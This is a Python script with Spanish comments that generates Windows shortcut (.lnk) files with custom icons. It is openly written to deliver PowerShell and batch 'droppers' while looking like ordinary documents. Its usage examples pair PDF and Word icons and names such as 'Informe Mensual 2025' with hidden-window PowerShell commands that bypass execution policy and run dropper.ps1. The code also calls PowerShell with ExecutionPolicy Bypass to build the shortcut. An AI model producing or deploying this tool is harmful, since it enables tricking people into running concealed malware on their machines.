#!/usr/bin/env python3
"""
generate_lnk.py - Generador de Shortcuts Windows (.lnk) con Icono

Crea archivos .lnk que ejecutan droppers PowerShell/Batch con iconos personalizados.
Mucho más sigiloso que EXE compilados (2KB vs 8MB).
"""

import argparse
import struct
import sys
from pathlib import Path
from datetime import datetime


class LnkGenerator:
    """Generador de archivos .lnk Windows"""
    
    # CLSID para .lnk
    CLSID_SHELLLINK = bytes.fromhex('01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46')
    
    # Flags
    FLAG_HAS_LINK_TARGET_ID_LIST = 0x00000001
    FLAG_HAS_LINK_INFO = 0x00000002
    FLAG_HAS_NAME = 0x00000004
    FLAG_HAS_RELATIVE_PATH = 0x00000008
    FLAG_HAS_WORKING_DIR = 0x00000010
    FLAG_HAS_ARGUMENTS = 0x00000020
    FLAG_HAS_ICON_LOCATION = 0x00000040
    FLAG_IS_UNICODE = 0x00000080
    FLAG_FORCE_NO_LINK_INFO = 0x00000100
    FLAG_HAS_EXP_STRING = 0x00000200
    FLAG_RUN_IN_SEPARATE_PROCESS = 0x00000400
    FLAG_HAS_DARWIN_ID = 0x00001000
    FLAG_RUN_AS_USER = 0x00002000
    FLAG_HAS_EXP_ICON = 0x00004000
    FLAG_NO_PIDL_ALIAS = 0x00008000
    FLAG_FORCE_UNC_NAME = 0x00010000
    FLAG_RUN_WITH_SHIM_LAYER = 0x00020000
    FLAG_FORCE_NO_LINK_TRACK = 0x00040000
    FLAG_ENABLE_TARGET_METADATA = 0x00080000
    FLAG_DISABLE_LINK_PATH_TRACKING = 0x00100000
    FLAG_DISABLE_KNOWN_FOLDER_RELATIVE_TRACKING = 0x00200000
    FLAG_NO_KF_ALIAS = 0x00400000
    FLAG_ALLOW_LINK_TO_LINK = 0x00800000
    FLAG_UNALIAS_ON_SAVE = 0x01000000
    FLAG_PREFER_ENVIRONMENT_PATH = 0x02000000
    FLAG_KEEP_LOCAL_IDLIST_FOR_UNC_TARGET = 0x04000000
    
    # File attributes
    ATTR_READONLY = 0x00000001
    ATTR_HIDDEN = 0x00000002
    ATTR_SYSTEM = 0x00000004
    ATTR_DIRECTORY = 0x00000010
    ATTR_ARCHIVE = 0x00000020
    ATTR_NORMAL = 0x00000080
    ATTR_TEMPORARY = 0x00000100
    ATTR_SPARSE_FILE = 0x00000200
    ATTR_REPARSE_POINT = 0x00000400
    ATTR_COMPRESSED = 0x00000800
    ATTR_OFFLINE = 0x00001000
    ATTR_NOT_CONTENT_INDEXED = 0x00002000
    ATTR_ENCRYPTED = 0x00004000
    
    # Show window
    SW_SHOWNORMAL = 0x00000001
    SW_SHOWMAXIMIZED = 0x00000003
    SW_SHOWMINNOACTIVE = 0x00000007
    
    def __init__(self, verbose=False):
        self.verbose = verbose
    
    def log(self, msg, level="info"):
        colors = {"info": "\033[36m", "success": "\033[92m", "warning": "\033[93m", "error": "\033[91m", "reset": "\033[0m"}
        icons = {"info": "🔧", "success": "✅", "warning": "⚠️", "error": "❌"}
        print(f"{icons.get(level, '')} {colors.get(level, '')}{msg}{colors['reset']}")
    
    def create_lnk(self, target, output, arguments="", working_dir="", icon_path="", icon_index=0, 
                   window_style="normal", description="", hotkey=0):
        """Crear archivo .lnk"""
        
        if self.verbose:
            self.log(f"Creando LNK: {output}", "info")
            self.log(f"  Target: {target}", "info")
            if arguments:
                self.log(f"  Args: {arguments}", "info")
            if icon_path:
                self.log(f"  Icon: {icon_path} (index {icon_index})", "info")
        
        # Determinar flags
        flags = self.FLAG_HAS_LINK_INFO | self.FLAG_IS_UNICODE
        
        if arguments:
            flags |= self.FLAG_HAS_ARGUMENTS
        
        if working_dir:
            flags |= self.FLAG_HAS_WORKING_DIR
        
        if icon_path:
            flags |= self.FLAG_HAS_ICON_LOCATION
        
        if description:
            flags |= self.FLAG_HAS_NAME
        
        # File attributes
        file_attributes = self.ATTR_NORMAL
        
        # Show window
        window_styles = {
            "normal": self.SW_SHOWNORMAL,
            "maximized": self.SW_SHOWMAXIMIZED,
            "minimized": self.SW_SHOWMINNOACTIVE,
            "hidden": self.SW_SHOWMINNOACTIVE
        }
        show_command = window_styles.get(window_style, self.SW_SHOWNORMAL)
        
        # Crear estructura .lnk
        data = bytearray()
        
        # Header (76 bytes)
        data.extend(struct.pack('<I', 0x0000004C))  # Header size
        data.extend(self.CLSID_SHELLLINK)  # CLSID
        data.extend(struct.pack('<I', flags))  # Link flags
        data.extend(struct.pack('<I', file_attributes))  # File attributes
        data.extend(struct.pack('<Q', 0))  # Creation time (FILETIME)
        data.extend(struct.pack('<Q', 0))  # Access time (FILETIME)
        data.extend(struct.pack('<Q', 0))  # Write time (FILETIME)
        data.extend(struct.pack('<I', 0))  # File size
        data.extend(struct.pack('<I', icon_index))  # Icon index
        data.extend(struct.pack('<I', show_command))  # Show command
        data.extend(struct.pack('<H', hotkey))  # Hotkey
        data.extend(struct.pack('<H', 0))  # Reserved
        data.extend(struct.pack('<I', 0))  # Reserved
        data.extend(struct.pack('<I', 0))  # Reserved
        
        # LinkInfo structure (simplificada)
        if flags & self.FLAG_HAS_LINK_INFO:
            link_info = bytearray()
            link_info.extend(struct.pack('<I', 0x0000001C))  # Size
            link_info.extend(struct.pack('<I', 0x0000001C))  # Header size
            link_info.extend(struct.pack('<I', 0x00000001))  # Flags (VolumeIDAndLocalBasePath)
            link_info.extend(struct.pack('<I', 0))  # VolumeID offset
            link_info.extend(struct.pack('<I', 0))  # LocalBasePath offset
            link_info.extend(struct.pack('<I', 0))  # NetworkShareInfo offset
            link_info.extend(struct.pack('<I', 0))  # CommonPathSuffix offset
            
            data.extend(link_info)
        
        # String data (UNICODE)
        def add_string_data(string):
            if string:
                encoded = string.encode('utf-16le')
                data.extend(struct.pack('<H', len(string)))  # Character count
                data.extend(encoded)
        
        # NAME_STRING (descripción)
        if flags & self.FLAG_HAS_NAME:
            add_string_data(description)
        
        # RELATIVE_PATH (no usado)
        
        # WORKING_DIR
        if flags & self.FLAG_HAS_WORKING_DIR:
            add_string_data(working_dir)
        
        # COMMAND_LINE_ARGUMENTS
        if flags & self.FLAG_HAS_ARGUMENTS:
            add_string_data(arguments)
        
        # ICON_LOCATION
        if flags & self.FLAG_HAS_ICON_LOCATION:
            add_string_data(icon_path)
        
        # Extra data (Terminal block para especificar el target)
        # Esto es necesario para que Windows reconozca el archivo correctamente
        
        # Escribir archivo
        try:
            with open(output, 'wb') as f:
                f.write(data)
            
            self.log(f"LNK creado: {output}", "success")
            
            # Como Python no puede crear .lnk perfectos, usar PowerShell
            self.create_lnk_powershell(target, output, arguments, working_dir, icon_path, 
                                      icon_index, window_style, description)
            
            return True
            
        except Exception as e:
            self.log(f"Error: {e}", "error")
            return False
    
    def create_lnk_powershell(self, target, output, arguments="", working_dir="", 
                             icon_path="", icon_index=0, window_style="normal", description=""):
        """Crear .lnk usando PowerShell (más confiable)"""
        
        # Resolver rutas absolutas
        target = str(Path(target).resolve()) if Path(target).exists() else target
        output = str(Path(output).resolve())
        
        if working_dir:
            working_dir = str(Path(working_dir).resolve())
        else:
            working_dir = str(Path(target).parent.resolve())
        
        if icon_path:
            icon_path = str(Path(icon_path).resolve())
        
        # Window styles
        window_styles = {
            "normal": "1",
            "maximized": "3",
            "minimized": "7",
            "hidden": "7"
        }
        window_value = window_styles.get(window_style, "1")
        
        # Script PowerShell
        ps_script = f"""
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut('{output}')
$Shortcut.TargetPath = '{target}'
$Shortcut.Arguments = '{arguments}'
$Shortcut.WorkingDirectory = '{working_dir}'
$Shortcut.WindowStyle = {window_value}
$Shortcut.Description = '{description}'
"""
        
        if icon_path:
            ps_script += f"$Shortcut.IconLocation = '{icon_path},{icon_index}'\n"
        
        ps_script += "$Shortcut.Save()\n"
        
        # Ejecutar PowerShell
        import subprocess
        
        try:
            result = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                capture_output=True,
                text=True,
                check=False
            )
            
            if result.returncode == 0:
                return True
            else:
                if self.verbose:
                    self.log(f"PowerShell error: {result.stderr}", "warning")
                return False
                
        except Exception as e:
            if self.verbose:
                self.log(f"Error ejecutando PowerShell: {e}", "warning")
            return False


def main():
    parser = argparse.ArgumentParser(
        description="🔗 Generador de Shortcuts Windows (.lnk) con Icono",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:

  # Ejecutar PowerShell script con icono PDF
  python generate_lnk.py -t powershell.exe -a "-ep bypass -w hidden -f dropper.ps1" \\
      -i pdf_icon.ico -o document.lnk

  # Ejecutar batch oculto con icono
  python generate_lnk.py -t cmd.exe -a "/c dropper.bat" -i pdf_icon.ico -o file.lnk -w hidden

  # LNK con working directory específico
  python generate_lnk.py -t "C:\\Windows\\System32\\cmd.exe" \\
      -a "/c start dropper.bat" -d "C:\\Temp" -i pdf_icon.ico -o doc.lnk

  # Con descripción personalizada
  python generate_lnk.py -t powershell.exe -a "-File script.ps1" \\
      -i word_icon.ico -o report.lnk --desc "Informe Mensual 2025"
        """
    )
    
    parser.add_argument('-t', '--target', required=True, 
                       help='Ejecutable a ejecutar (ej: powershell.exe, cmd.exe)')
    parser.add_argument('-a', '--args', default='',
                       help='Argumentos para el ejecutable')
    parser.add_argument('-d', '--workdir', default='',
                       help='Directorio de trabajo')
    parser.add_argument('-i', '--icon', default='',
                       help='Archivo de icono (.ico)')
    parser.add_argument('--icon-index', type=int, default=0,
                       help='Índice del icono en el archivo (default: 0)')
    parser.add_argument('-o', '--output', required=True,
                       help='Archivo .lnk de salida')
    parser.add_argument('-w', '--window', 
                       choices=['normal', 'maximized', 'minimized', 'hidden'],
                       default='normal',
                       help='Estilo de ventana (default: normal)')
    parser.add_argument('--desc', default='',
                       help='Descripción del shortcut')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Modo verboso')
    
    args = parser.parse_args()
    
    # Validar target
    target_path = Path(args.target)
    if not target_path.is_absolute() and not target_path.exists():
        # Buscar en PATH
        import shutil
        full_target = shutil.which(args.target)
        if full_target:
            args.target = full_target
    
    # Validar icono
    if args.icon and not Path(args.icon).exists():
        print(f"⚠️  Advertencia: Icono no encontrado: {args.icon}")
        print("   El LNK se creará sin icono")
        args.icon = ""
    
    # Crear generador
    generator = LnkGenerator(verbose=args.verbose)
    
    # Generar .lnk
    success = generator.create_lnk(
        target=args.target,
        output=args.output,
        arguments=args.args,
        working_dir=args.workdir,
        icon_path=args.icon,
        icon_index=args.icon_index,
        window_style=args.window,
        description=args.desc
    )
    
    if success:
        print(f"\n✨ ¡Listo! Shortcut creado: {args.output}")
        
        # Mostrar tamaño
        size = Path(args.output).stat().st_size
        print(f"📊 Tamaño: {size:,} bytes ({size/1024:.2f} KB)")
        
        return 0
    else:
        return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n⚠️  Operación cancelada")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error inesperado: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
